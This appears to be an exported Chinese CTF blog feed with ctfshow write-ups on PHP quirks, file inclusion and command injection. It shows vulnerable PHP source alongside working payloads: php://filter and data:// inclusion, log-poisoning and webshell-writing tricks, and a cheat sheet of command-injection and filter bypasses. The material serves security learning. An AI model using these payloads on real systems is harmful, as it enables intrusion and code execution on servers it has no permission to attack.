title="web110"></a>web110</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"echo new $v1($v2());"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;phpff.com&#x2F;filesystemiterator</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;class.filesystemiterator.php</span><br></pre></td></tr></table></figure><p>利用filesystemiterator类带出指定目录下的所有文件</p><p><code>getcwd</code>，查看当前路径下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">(&amp;$v1,&amp;$v2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"$$v1 = &amp;$$v2;"</span>);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/'</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/ctfshow/'</span>, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//变量覆盖+GLOBALS全局变量</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hacker!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hacker!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用php伪协议，过滤rot13，string，base64，可以用base16或者base32等绕过</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base16-encode/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.icnov.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hacker!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filter过滤器被过滤，伪协议用不了了</p><p>这里主要是要绕过<code>is_file()</code>这个php的内置函数</p><p>这里查阅资料可以构造软链接，超过二十次就可以绕过<code>is_file</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">    非预期</span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span>,$file))&#123;<span class="comment">//禁用了convert，data等，但是放出了filter，不编码格式直接读</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($num)</span></span>&#123;</span><br><span class="line">    $num=str_replace(<span class="string">"0x"</span>,<span class="string">"1"</span>,$num);<span class="comment">//十六进制被禁</span></span><br><span class="line">    $num=str_replace(<span class="string">"0"</span>,<span class="string">"1"</span>,$num);<span class="comment">//八进制被禁</span></span><br><span class="line">    $num=str_replace(<span class="string">"."</span>,<span class="string">"1"</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">"e"</span>,<span class="string">"1"</span>,$num);<span class="comment">//科学计数法</span></span><br><span class="line">    $num=str_replace(<span class="string">"+"</span>,<span class="string">"1"</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">'36'</span> <span class="keyword">and</span> trim($num)!==<span class="string">'36'</span> <span class="keyword">and</span> filter($num)==<span class="string">'36'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">'36'</span>)&#123;<span class="comment">//trim()过滤空格以及\n\r\t\v\0,不过滤\f</span></span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>转义字符绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=%<span class="number">0</span>c36<span class="comment">//%0c==\f</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php特性
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>filecontains</title>
    <link href="http://yoursite.com/2020/09/24/filecontains/"/>
    <id>http://yoursite.com/2020/09/24/filecontains/</id>
    <published>2020-09-24T12:19:35.000Z</published>
    <updated>2020-10-04T07:26:46.954Z</updated>
    
    <content type="html"><![CDATA[<h3 id="filecontain"><a href="#filecontain" class="headerlink" title="filecontain"></a>filecontain<a id="more"></a></h3><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件包含，没有给出回显</p><p>尝试伪协议包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匹配到php就会被替换，这里可以用data协议写入命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">(attention:加密最好用本地工具，网上加密有区别)</span><br></pre></td></tr></table></figure><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>data协议也不能用了，这里想到可能可以通过写入日志文件进行包含来<code>getshell</code>，burp抓包修改UA</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">UA:<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span><span class="comment">//<span class="meta">&lt;?php</span> system('cat fl0g.php');<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><img src="/2020/09/24/filecontains/1.png" class=""><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤了个冒号，上题方法打通</p><h3 id="web82-web86"><a href="#web82-web86" class="headerlink" title="web82-web86"></a>web82-web86</h3><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">"&lt;?php die('大佬别秀了');?&gt;"</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的知识点，<code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code>，很详细</p><p>使用base64进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-decode/resource=xxx.php</span></span><br><span class="line">POST: content=aaPD9waHAgIGV2YWwoJF9QT1NUWzFdKTs%<span class="number">2</span>FPg%<span class="number">3</span>D%<span class="number">3</span>D</span><br><span class="line">进行url双编码</span><br><span class="line">通过base64过滤之后就只有(phpdie)<span class="number">6</span>个字符我们就要添加<span class="number">2</span>个字符让前面的可以进行编码，bases64，<span class="number">4</span>个字符一组</span><br></pre></td></tr></table></figure><img src="/2020/09/24/filecontains/2.png" class=""><p>之后再访问写入的文件路径，即可以进行命令执行</p><img src="/2020/09/24/filecontains/3.png" class=""><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure><p>作了很多的过滤，但是冒号被放出来了，依旧可以用data协议，这里注意到等号被过滤了，加密之后的内容赋值时去掉等号即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs</span></span><br></pre></td></tr></table></figure><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>开题是个视频，下载，foremost拿到一张源码图片</p><img src="/2020/09/24/filecontains/4.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'too young too simple sometimes naive!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">$contents=$_POST[<span class="string">'contents'</span>];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, <span class="string">"&lt;?php die();?&gt;"</span>.$contents);</span><br></pre></td></tr></table></figure><p>使用其他的过滤器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</span></span><br><span class="line">post：contents=?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?</span><br><span class="line">    </span><br><span class="line">再访问<span class="number">1.</span>php，利用shell</span><br><span class="line">Qftm=system(<span class="string">'cat flag.php'</span>);</span><br><span class="line"></span><br><span class="line">附上文章：https:<span class="comment">//www.anquanke.com/post/id/202510#h3-15</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;filecontain&quot;&gt;&lt;a href=&quot;#filecontain&quot; class=&quot;headerlink&quot; title=&quot;filecontain&quot;&gt;&lt;/a&gt;filecontain
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>ctfshowcommand</title>
    <link href="http://yoursite.com/2020/09/22/ctfshowcommand/"/>
    <id>http://yoursite.com/2020/09/22/ctfshowcommand/</id>
    <published>2020-09-22T10:37:30.000Z</published>
    <updated>2020-09-24T11:53:53.203Z</updated>
    
    <content type="html"><![CDATA[<h3 id="command绕过"><a href="#command绕过" class="headerlink" title="command绕过"></a>command绕过<a id="more"></a></h3><h4 id="知识总结，写在前面"><a href="#知识总结，写在前面" class="headerlink" title="知识总结，写在前面"></a>知识总结，写在前面</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">分隔命令</span><br><span class="line">;<span class="comment">//分号应该是最好理解的</span></span><br><span class="line">|<span class="comment">//只执行后面那条命令</span></span><br><span class="line">||<span class="comment">//只执行前面那条命令</span></span><br><span class="line">&amp;<span class="comment">//两条命令都会执行，不知道是不是自己姿势不对，没成功，下面也是一样</span></span><br><span class="line">&amp;&amp;<span class="comment">//两条命令都会执行</span></span><br><span class="line"></span><br><span class="line">空格绕过</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;<span class="comment">//需要写的权限</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line">%<span class="number">3</span>c</span><br><span class="line">A=$<span class="string">'cat\x20flag'</span>&amp;&amp;$A</span><br><span class="line">A=$<span class="string">'cat\x09flag'</span>&amp;&amp;$A</span><br><span class="line">黑名单</span><br><span class="line"><span class="comment">//一般情况像flag、php这种字符会被ban掉，这时候就需要进行绕过了</span></span><br><span class="line">通配符</span><br><span class="line">*<span class="comment">//匹配任何文本或字符串，这个通过测试发现并不能与IFS或&lt;这两个字符一起使用</span></span><br><span class="line">?<span class="comment">//匹配单个任意字符</span></span><br><span class="line"> </span><br><span class="line">空字符</span><br><span class="line">$@<span class="comment">//ca$@t flag</span></span><br><span class="line">$<span class="number">1</span>-$<span class="number">9</span><span class="comment">//ca$1t flag</span></span><br><span class="line">$&#123;数字&#125;  <span class="comment">//ca$&#123;1&#125;t flag</span></span><br><span class="line"> </span><br><span class="line">编码绕过</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Y2F0IGZsYWcucGhwCg=="</span>|base64 -d|bash<span class="comment">//解码为cat flag.php并执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"cat flag.php"</span>|base64<span class="comment">//最好别在在线网站编码，不然可能会将空格转成url编码，从而无法执行命令</span></span><br><span class="line"> </span><br><span class="line">变量替换</span><br><span class="line">a=t;b=g;ca$a fla$b.php</span><br><span class="line"> </span><br><span class="line">引号</span><br><span class="line">ca<span class="string">''</span>t fl<span class="string">''</span>ag.php</span><br><span class="line"></span><br><span class="line">反斜杆</span><br><span class="line"></span><br><span class="line">ca\t f\la\g.php</span><br><span class="line">Linux查看文件命令</span><br><span class="line">cat<span class="comment">//cat flag.php</span></span><br><span class="line">tac<span class="comment">//tac flag.php</span></span><br><span class="line">head<span class="comment">//head flag.php</span></span><br><span class="line">tail<span class="comment">//tail flag.php</span></span><br><span class="line">nl<span class="comment">//nl flag.php</span></span><br><span class="line">more<span class="comment">//more flag.php</span></span><br><span class="line">less<span class="comment">//less flag.php</span></span><br><span class="line">od<span class="comment">//od flag.php</span></span><br><span class="line">grep<span class="comment">//grep 'fla' flag.php</span></span><br><span class="line">strings<span class="comment">//strings flag.php</span></span><br><span class="line">sort<span class="comment">//sort flag.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line">pos()：返回数组中的当前元素的值。</span><br><span class="line">array_reverse()：数组逆序</span><br><span class="line">scandir()：获取目录下的文件</span><br><span class="line">next()： 函数将内部指针指向数组中的下一个元素，并输出。</span><br></pre></td></tr></table></figure><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 